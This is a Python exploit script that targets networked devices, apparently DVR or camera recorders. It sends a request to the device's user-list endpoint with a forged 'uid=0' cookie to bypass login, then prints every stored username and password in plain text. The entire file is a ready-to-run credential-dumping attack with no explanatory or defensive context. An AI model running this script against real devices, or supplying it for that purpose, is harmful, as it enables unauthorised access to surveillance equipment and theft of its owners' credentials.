import argparse
import requests


def main():
    parser = argparse.ArgumentParser(description="Specify an host and an optional port.")

    parser.add_argument("host", type=str)
    parser.add_argument("--port", "-p", type=str, default="")

    args = parser.parse_args()

    # noinspection PyBroadException
    try:
        # noinspection HttpUrlsUsage
        json = requests.get(f"http://{args.host}:{args.port}/device.rsp?opt=user&cmd=list", headers={
            "Cookie": "uid=0"
        }).json()

        for user in json["list"]:
            print(user["uid"], user["pwd"])

    except Exception as e:
        print(e)


if __name__ == "__main__":
    main()
